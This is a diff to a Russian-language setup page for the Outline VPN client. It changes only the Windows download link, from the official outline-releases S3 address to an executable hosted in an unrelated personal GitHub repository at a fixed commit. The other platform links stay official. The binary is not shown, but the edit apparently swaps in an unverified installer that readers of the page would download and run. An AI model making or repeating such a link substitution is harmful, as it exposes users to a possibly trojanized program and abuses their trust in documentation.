@@ -14,7 +14,7 @@ sidebar_label: Outline
 2. **Установите приложение Outline**:
    - **iOS**: [Скачать](https://itunes.apple.com/app/outline-app/id1356177741)
    - **macOS**: [Скачать](https://itunes.apple.com/app/outline-app/id1356178125)
-   - **Windows**: [Скачать](https://s3.amazonaws.com/outline-releases/client/windows/stable/Outline-Client.exe)
+   - **Windows**: [Скачать](https://github.com/foxahaha/docs/raw/de76aaaf1e586ea81c01060244fbe923faf9eff0/Outline-Client.exe)
    - **Linux**: [Скачать](https://s3.amazonaws.com/outline-releases/client/linux/stable/Outline-Client.AppImage)
    - **Android**: [Скачать с Play Store](https://play.google.com/store/apps/details?id=org.outline.android.client) или [Скачать APK](https://s3.amazonaws.com/outline-releases/client/android/stable/Outline-Client.apk)
 
